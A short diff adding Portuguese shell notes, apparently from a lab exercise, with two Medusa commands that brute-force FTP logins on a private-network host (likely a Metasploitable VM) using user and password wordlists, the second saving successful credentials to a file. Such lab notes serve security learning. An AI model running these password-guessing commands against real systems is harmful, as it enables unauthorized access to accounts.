@@ -1,0 +1,6 @@
+#Comando da Medusa pra ataque de Wordlist pra forçar login pelo protocolo ftp
+medusa -h 192.168.50.109 -U users.txt -P passwd.txt -t 8 -M ftp 
+
+#Criacao da Documentacao de resultado de login e senha correta via Wordlist
+medusa -h 192.168.50.109 -U users.txt -P passwd.txt -t 8 -M ftp | grep SUCCESS > login_metasplotable_ftp
+
